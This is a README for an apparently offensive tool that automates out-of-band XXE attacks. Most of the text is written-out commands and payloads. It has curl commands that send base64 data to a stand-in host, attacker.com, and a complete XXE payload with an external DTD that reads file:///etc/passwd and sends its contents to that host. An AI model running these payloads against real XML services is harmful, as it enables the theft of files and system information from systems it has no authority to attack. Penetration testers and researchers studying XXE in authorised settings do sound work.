# XXE-OOB-Helper
Useful helper for out-of-bound XXE attacks

## Example
Starting OOB Helper:

```bash
$ oob.py -d http://attacker.com:32032 -p 32032
```

Simulating payload exfiltration

```bash
$ # Both are decoded to "Hello" in window where oob.py is launched
$ curl 'http://attacker.com:32032/exfil/query?decoder=b64u&data=SGVsbG8%3D'
$ curl -XPOST -d "SGVsbG8=" 'http://attacker.com:32032/exfil/post?decoder=b64'
```

Getting payload to exfiltrate file:///etc/passwd with DTD
```bash
$ curl 'http://attacker.com:32032/payload?entity=file:///etc/passwd'
<?xml version="1.0" ?>
<!DOCTYPE r [
   <!ELEMENT r ANY >
   <!ENTITY % sp SYSTEM "http://attacker.com:32032/dtd?entity=file:///etc/passwd">
   %sp;
   %param1;
   %exfil;
]>
$ curl 'http://attacker.com:32032/dtd?entity=file:///etc/passwd'
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:32032/exfil/query?data=%data;'>">
```

## Features
- Generate simple XXE / DTD payloads from templates.
- Grep payload from GET / POST requests.
- Decode payload in popular encodings, like URL encoding or Base64
